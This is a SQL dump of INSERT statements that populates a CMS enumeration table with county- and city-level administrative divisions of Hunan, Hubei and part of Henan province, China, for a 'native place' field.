INSERT INTO dede_sys_enum VALUES ('18735', '涟源市', '9513.5', 'nativeplace', '9514', '2');
INSERT INTO dede_sys_enum VALUES ('18734', '冷水江市', '9513.4', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18733', '新化县', '9513.3', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18732', '双峰县', '9513.2', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18731', '娄星区', '9513.1', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18730', '娄底市', '9513', 'nativeplace', '9513', '1');
INSERT INTO dede_sys_enum VALUES ('18729', '洪江市', '9512.12', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18728', '通道侗族自治县', '9512.11', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18727', '靖州苗族侗族自治县', '9512.10', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18726', '芷江侗族自治县', '9512.9', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18725', '新晃侗族自治县', '9512.8', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18724', '麻阳苗族自治县', '9512.7', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18723', '会同县', '9512.6', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18722', '溆浦县', '9512.5', 'nativeplace', '9513', '2');
INSERT INTO dede_sys_enum VALUES ('18721', '辰溪县', '9512.4', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18720', '沅陵县', '9512.3', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18719', '中方县', '9512.2', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18718', '鹤城区', '9512.1', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18717', '怀化市', '9512', 'nativeplace', '9512', '1');
INSERT INTO dede_sys_enum VALUES ('18716', '江华瑶族自治县', '9511.11', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18715', '新田县', '9511.10', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18714', '蓝山县', '9511.9', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18713', '宁远县', '9511.8', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18712', '江永县', '9511.7', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18711', '道　县', '9511.6', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18710', '双牌县', '9511.5', 'nativeplace', '9512', '2');
INSERT INTO dede_sys_enum VALUES ('18709', '东安县', '9511.4', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18708', '祁阳县', '9511.3', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18707', '冷水滩区', '9511.2', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18706', '芝山区', '9511.1', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18705', '永州市', '9511', 'nativeplace', '9511', '1');
INSERT INTO dede_sys_enum VALUES ('18704', '资兴市', '9510.11', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18703', '安仁县', '9510.10', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18702', '桂东县', '9510.9', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18701', '汝城县', '9510.8', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18700', '临武县', '9510.7', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18699', '嘉禾县', '9510.6', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18698', '永兴县', '9510.5', 'nativeplace', '9511', '2');
INSERT INTO dede_sys_enum VALUES ('18697', '宜章县', '9510.4', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18696', '桂阳县', '9510.3', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18695', '苏仙区', '9510.2', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18694', '北湖区', '9510.1', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18693', '郴州市', '9510', 'nativeplace', '9510', '1');
INSERT INTO dede_sys_enum VALUES ('18692', '沅江市', '9509.6', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18691', '安化县', '9509.5', 'nativeplace', '9510', '2');
INSERT INTO dede_sys_enum VALUES ('18690', '桃江县', '9509.4', 'nativeplace', '9509', '2');
INSERT INTO dede_sys_enum VALUES ('18689', '南　县', '9509.3', 'nativeplace', '9509', '2');
INSERT INTO dede_sys_enum VALUES ('18688', '赫山区', '9509.2', 'nativeplace', '9509', '2');
INSERT INTO dede_sys_enum VALUES ('18687', '资阳区', '9509.1', 'nativeplace', '9509', '2');
INSERT INTO dede_sys_enum VALUES ('18686', '益阳市', '9509', 'nativeplace', '9509', '1');
INSERT INTO dede_sys_enum VALUES ('18685', '桑植县', '9508.4', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18684', '慈利县', '9508.3', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18683', '武陵源区', '9508.2', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18682', '永定区', '9508.1', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18681', '张家界市', '9508', 'nativeplace', '9508', '1');
INSERT INTO dede_sys_enum VALUES ('18680', '津市市', '9507.9', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18679', '石门县', '9507.8', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18678', '桃源县', '9507.7', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18677', '临澧县', '9507.6', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18676', '澧　县', '9507.5', 'nativeplace', '9508', '2');
INSERT INTO dede_sys_enum VALUES ('18675', '汉寿县', '9507.4', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18674', '安乡县', '9507.3', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18673', '鼎城区', '9507.2', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18672', '武陵区', '9507.1', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18671', '常德市', '9507', 'nativeplace', '9507', '1');
INSERT INTO dede_sys_enum VALUES ('18670', '临湘市', '9506.9', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18669', '汨罗市', '9506.8', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18668', '平江县', '9506.7', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18667', '湘阴县', '9506.6', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18666', '华容县', '9506.5', 'nativeplace', '9507', '2');
INSERT INTO dede_sys_enum VALUES ('18665', '岳阳县', '9506.4', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18664', '君山区', '9506.3', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18663', '云溪区', '9506.2', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18662', '岳阳楼区', '9506.1', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18661', '岳阳市', '9506', 'nativeplace', '9506', '1');
INSERT INTO dede_sys_enum VALUES ('18660', '武冈市', '9505.12', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18659', '城步苗族自治县', '9505.11', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18658', '新宁县', '9505.10', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18657', '绥宁县', '9505.9', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18656', '洞口县', '9505.8', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18655', '隆回县', '9505.7', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18654', '邵阳县', '9505.6', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18653', '新邵县', '9505.5', 'nativeplace', '9506', '2');
INSERT INTO dede_sys_enum VALUES ('18652', '邵东县', '9505.4', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18651', '北塔区', '9505.3', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18650', '大祥区', '9505.2', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18649', '双清区', '9505.1', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18648', '邵阳市', '9505', 'nativeplace', '9505', '1');
INSERT INTO dede_sys_enum VALUES ('18647', '常宁市', '9504.12', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18646', '耒阳市', '9504.11', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18645', '祁东县', '9504.10', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18644', '衡东县', '9504.9', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18643', '衡山县', '9504.8', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18642', '衡南县', '9504.7', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18641', '衡阳县', '9504.6', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18640', '南岳区', '9504.5', 'nativeplace', '9505', '2');
INSERT INTO dede_sys_enum VALUES ('18639', '蒸湘区', '9504.4', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18638', '石鼓区', '9504.3', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18637', '雁峰区', '9504.2', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18636', '珠晖区', '9504.1', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18635', '衡阳市', '9504', 'nativeplace', '9504', '1');
INSERT INTO dede_sys_enum VALUES ('18634', '韶山市', '9503.5', 'nativeplace', '9504', '2');
INSERT INTO dede_sys_enum VALUES ('18633', '湘乡市', '9503.4', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18632', '湘潭县', '9503.3', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18631', '岳塘区', '9503.2', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18630', '雨湖区', '9503.1', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18629', '湘潭市', '9503', 'nativeplace', '9503', '1');
INSERT INTO dede_sys_enum VALUES ('18628', '醴陵市', '9502.9', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18627', '炎陵县', '9502.8', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18626', '茶陵县', '9502.7', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18625', '攸　县', '9502.6', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18624', '株洲县', '9502.5', 'nativeplace', '9503', '2');
INSERT INTO dede_sys_enum VALUES ('18623', '天元区', '9502.4', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18622', '石峰区', '9502.3', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18621', '芦淞区', '9502.2', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18620', '荷塘区', '9502.1', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18619', '株洲市', '9502', 'nativeplace', '9502', '1');
INSERT INTO dede_sys_enum VALUES ('18618', '浏阳市', '9501.9', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18617', '宁乡县', '9501.8', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18616', '望城县', '9501.7', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18615', '长沙县', '9501.6', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18614', '雨花区', '9501.5', 'nativeplace', '9502', '2');
INSERT INTO dede_sys_enum VALUES ('18613', '开福区', '9501.4', 'nativeplace', '9501', '2');
INSERT INTO dede_sys_enum VALUES ('18612', '岳麓区', '9501.3', 'nativeplace', '9501', '2');
INSERT INTO dede_sys_enum VALUES ('18611', '天心区', '9501.2', 'nativeplace', '9501', '2');
INSERT INTO dede_sys_enum VALUES ('18610', '芙蓉区', '9501.1', 'nativeplace', '9501', '2');
INSERT INTO dede_sys_enum VALUES ('18609', '长沙市', '9501', 'nativeplace', '9501', '1');
INSERT INTO dede_sys_enum VALUES ('18608', '湖南省', '9500', 'nativeplace', '9500', '0');
INSERT INTO dede_sys_enum VALUES ('18607', '神农架林区', '9014.4', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18606', '天门市', '9014.3', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18605', '潜江市', '9014.2', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18604', '仙桃市', '9014.1', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18603', '省直辖行政单位', '9014', 'nativeplace', '9014', '1');
INSERT INTO dede_sys_enum VALUES ('18602', '鹤峰县', '9013.8', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18601', '来凤县', '9013.7', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18600', '咸丰县', '9013.6', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18599', '宣恩县', '9013.5', 'nativeplace', '9014', '2');
INSERT INTO dede_sys_enum VALUES ('18598', '巴东县', '9013.4', 'nativeplace', '9013', '2');
INSERT INTO dede_sys_enum VALUES ('18597', '建始县', '9013.3', 'nativeplace', '9013', '2');
INSERT INTO dede_sys_enum VALUES ('18596', '利川市', '9013.2', 'nativeplace', '9013', '2');
INSERT INTO dede_sys_enum VALUES ('18595', '恩施市', '9013.1', 'nativeplace', '9013', '2');
INSERT INTO dede_sys_enum VALUES ('18594', '恩施土家族苗族自治州', '9013', 'nativeplace', '9013', '1');
INSERT INTO dede_sys_enum VALUES ('18593', '广水市', '9012.2', 'nativeplace', '9012', '2');
INSERT INTO dede_sys_enum VALUES ('18592', '曾都区', '9012.1', 'nativeplace', '9012', '2');
INSERT INTO dede_sys_enum VALUES ('18591', '随州市', '9012', 'nativeplace', '9012', '1');
INSERT INTO dede_sys_enum VALUES ('18590', '赤壁市', '9011.6', 'nativeplace', '9012', '2');
INSERT INTO dede_sys_enum VALUES ('18589', '通山县', '9011.5', 'nativeplace', '9012', '2');
INSERT INTO dede_sys_enum VALUES ('18588', '崇阳县', '9011.4', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18587', '通城县', '9011.3', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18586', '嘉鱼县', '9011.2', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18585', '咸安区', '9011.1', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18584', '咸宁市', '9011', 'nativeplace', '9011', '1');
INSERT INTO dede_sys_enum VALUES ('18583', '武穴市', '9010.10', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18582', '麻城市', '9010.9', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18581', '黄梅县', '9010.8', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18580', '蕲春县', '9010.7', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18579', '浠水县', '9010.6', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18578', '英山县', '9010.5', 'nativeplace', '9011', '2');
INSERT INTO dede_sys_enum VALUES ('18577', '罗田县', '9010.4', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18576', '红安县', '9010.3', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18575', '团风县', '9010.2', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18574', '州区', '9010.1', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18573', '黄冈市', '9010', 'nativeplace', '9010', '1');
INSERT INTO dede_sys_enum VALUES ('18572', '松滋市', '9009.8', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18571', '洪湖市', '9009.7', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18570', '石首市', '9009.6', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18569', '江陵县', '9009.5', 'nativeplace', '9010', '2');
INSERT INTO dede_sys_enum VALUES ('18568', '监利县', '9009.4', 'nativeplace', '9009', '2');
INSERT INTO dede_sys_enum VALUES ('18567', '公安县', '9009.3', 'nativeplace', '9009', '2');
INSERT INTO dede_sys_enum VALUES ('18566', '荆州区', '9009.2', 'nativeplace', '9009', '2');
INSERT INTO dede_sys_enum VALUES ('18565', '沙市区', '9009.1', 'nativeplace', '9009', '2');
INSERT INTO dede_sys_enum VALUES ('18564', '荆州市', '9009', 'nativeplace', '9009', '1');
INSERT INTO dede_sys_enum VALUES ('18563', '汉川市', '9008.7', 'nativeplace', '9009', '2');
INSERT INTO dede_sys_enum VALUES ('18562', '孝南区', '9008.6', 'nativeplace', '9009', '2');
INSERT INTO dede_sys_enum VALUES ('18561', '孝昌县', '9008.5', 'nativeplace', '9009', '2');
INSERT INTO dede_sys_enum VALUES ('18560', '大悟县', '9008.4', 'nativeplace', '9008', '2');
INSERT INTO dede_sys_enum VALUES ('18559', '云梦县', '9008.3', 'nativeplace', '9008', '2');
INSERT INTO dede_sys_enum VALUES ('18558', '应城市', '9008.2', 'nativeplace', '9008', '2');
INSERT INTO dede_sys_enum VALUES ('18557', '安陆市', '9008.1', 'nativeplace', '9008', '2');
INSERT INTO dede_sys_enum VALUES ('18556', '孝感市', '9008', 'nativeplace', '9008', '1');
INSERT INTO dede_sys_enum VALUES ('18555', '东宝区', '9007.5', 'nativeplace', '9008', '2');
INSERT INTO dede_sys_enum VALUES ('18554', '掇刀区', '9007.4', 'nativeplace', '9007', '2');
INSERT INTO dede_sys_enum VALUES ('18553', '京山县', '9007.3', 'nativeplace', '9007', '2');
INSERT INTO dede_sys_enum VALUES ('18552', '沙洋县', '9007.2', 'nativeplace', '9007', '2');
INSERT INTO dede_sys_enum VALUES ('18551', '钟祥市', '9007.1', 'nativeplace', '9007', '2');
INSERT INTO dede_sys_enum VALUES ('18550', '荆门市', '9007', 'nativeplace', '9007', '1');
INSERT INTO dede_sys_enum VALUES ('18549', '鄂城区', '9006.3', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18548', '华容区', '9006.2', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18547', '梁子湖区', '9006.1', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18546', '鄂州市', '9006', 'nativeplace', '9006', '1');
INSERT INTO dede_sys_enum VALUES ('18545', '宜城市', '9005.9', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18544', '枣阳市', '9005.8', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18543', '老河口市', '9005.7', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18542', '保康县', '9005.6', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18541', '谷城县', '9005.5', 'nativeplace', '9006', '2');
INSERT INTO dede_sys_enum VALUES ('18540', '南漳县', '9005.4', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18539', '襄阳区', '9005.3', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18538', '樊城区', '9005.2', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18537', '襄城区', '9005.1', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18536', '襄樊市', '9005', 'nativeplace', '9005', '1');
INSERT INTO dede_sys_enum VALUES ('18535', '枝江市', '9004.13', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18534', '当阳市', '9004.12', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18533', '宜都市', '9004.11', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18532', '五峰土家族自治县', '9004.10', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18531', '长阳土家族自治县', '9004.9', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18530', '秭归县', '9004.8', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18529', '兴山县', '9004.7', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18528', '远安县', '9004.6', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18527', '夷陵区', '9004.5', 'nativeplace', '9005', '2');
INSERT INTO dede_sys_enum VALUES ('18526', '?亭区', '9004.4', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18525', '点军区', '9004.3', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18524', '伍家岗区', '9004.2', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18523', '西陵区', '9004.1', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18522', '宜昌市', '9004', 'nativeplace', '9004', '1');
INSERT INTO dede_sys_enum VALUES ('18521', '丹江口市', '9003.8', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18520', '房　县', '9003.7', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18519', '竹溪县', '9003.6', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18518', '竹山县', '9003.5', 'nativeplace', '9004', '2');
INSERT INTO dede_sys_enum VALUES ('18517', '郧西县', '9003.4', 'nativeplace', '9003', '2');
INSERT INTO dede_sys_enum VALUES ('18516', '郧　县', '9003.3', 'nativeplace', '9003', '2');
INSERT INTO dede_sys_enum VALUES ('18515', '张湾区', '9003.2', 'nativeplace', '9003', '2');
INSERT INTO dede_sys_enum VALUES ('18514', '茅箭区', '9003.1', 'nativeplace', '9003', '2');
INSERT INTO dede_sys_enum VALUES ('18513', '十堰市', '9003', 'nativeplace', '9003', '1');
INSERT INTO dede_sys_enum VALUES ('18512', '大冶市', '9002.6', 'nativeplace', '9003', '2');
INSERT INTO dede_sys_enum VALUES ('18511', '阳新县', '9002.5', 'nativeplace', '9003', '2');
INSERT INTO dede_sys_enum VALUES ('18510', '铁山区', '9002.4', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18509', '下陆区', '9002.3', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18508', '西塞山区', '9002.2', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18507', '黄石港区', '9002.1', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18506', '黄石市', '9002', 'nativeplace', '9002', '1');
INSERT INTO dede_sys_enum VALUES ('18505', '新洲区', '9001.13', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18504', '黄陂区', '9001.12', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18503', '江夏区', '9001.11', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18502', '蔡甸区', '9001.10', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18501', '汉南区', '9001.9', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18500', '东西湖区', '9001.8', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18499', '洪山区', '9001.7', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18498', '青山区', '9001.6', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18497', '武昌区', '9001.5', 'nativeplace', '9002', '2');
INSERT INTO dede_sys_enum VALUES ('18496', '汉阳区', '9001.4', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18495', '乔口区', '9001.3', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18494', '江汉区', '9001.2', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18493', '江岸区', '9001.1', 'nativeplace', '9001', '2');
INSERT INTO dede_sys_enum VALUES ('18492', '武汉市', '9001', 'nativeplace', '9001', '1');
INSERT INTO dede_sys_enum VALUES ('18491', '湖北省', '9000', 'nativeplace', '9000', '0');
INSERT INTO dede_sys_enum VALUES ('18490', '新蔡县', '8517.10', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18489', '遂平县', '8517.9', 'nativeplace', '8518', '2');
INSERT INTO dede_sys_enum VALUES ('18488', '汝南县', '8517.8', 'nativeplace', '8518', '2');
INSERT INTO dede_sys_enum VALUES ('18487', '泌阳县', '8517.7', 'nativeplace', '8518', '2');
INSERT INTO dede_sys_enum VALUES ('18486', '确山县', '8517.6', 'nativeplace', '8518', '2');
INSERT INTO dede_sys_enum VALUES ('18485', '正阳县', '8517.5', 'nativeplace', '8518', '2');
INSERT INTO dede_sys_enum VALUES ('18484', '平舆县', '8517.4', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18483', '上蔡县', '8517.3', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18482', '西平县', '8517.2', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18481', '驿城区', '8517.1', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18480', '驻马店市', '8517', 'nativeplace', '8517', '1');
INSERT INTO dede_sys_enum VALUES ('18479', '项城市', '8516.10', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18478', '鹿邑县', '8516.9', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18477', '太康县', '8516.8', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18476', '淮阳县', '8516.7', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18475', '郸城县', '8516.6', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18474', '沈丘县', '8516.5', 'nativeplace', '8517', '2');
INSERT INTO dede_sys_enum VALUES ('18473', '商水县', '8516.4', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18472', '西华县', '8516.3', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18471', '扶沟县', '8516.2', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18470', '川汇区', '8516.1', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18469', '周口市', '8516', 'nativeplace', '8516', '1');
INSERT INTO dede_sys_enum VALUES ('18468', '息　县', '8515.10', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18467', '淮滨县', '8515.9', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18466', '潢川县', '8515.8', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18465', '固始县', '8515.7', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18464', '商城县', '8515.6', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18463', '新　县', '8515.5', 'nativeplace', '8516', '2');
INSERT INTO dede_sys_enum VALUES ('18462', '光山县', '8515.4', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18461', '罗山县', '8515.3', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18460', '平桥区', '8515.2', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18459', '师河区', '8515.1', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18458', '信阳市', '8515', 'nativeplace', '8515', '1');
INSERT INTO dede_sys_enum VALUES ('18457', '永城市', '8514.9', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18456', '夏邑县', '8514.8', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18455', '虞城县', '8514.7', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18454', '柘城县', '8514.6', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18453', '宁陵县', '8514.5', 'nativeplace', '8515', '2');
INSERT INTO dede_sys_enum VALUES ('18452', '睢　县', '8514.4', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18451', '民权县', '8514.3', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18450', '睢阳区', '8514.2', 'nativeplace', '8514', '2');
INSERT INTO dede_sys_enum VALUES ('18449', '梁园区', '8514.1', 'nativeplace', '8514', '2');
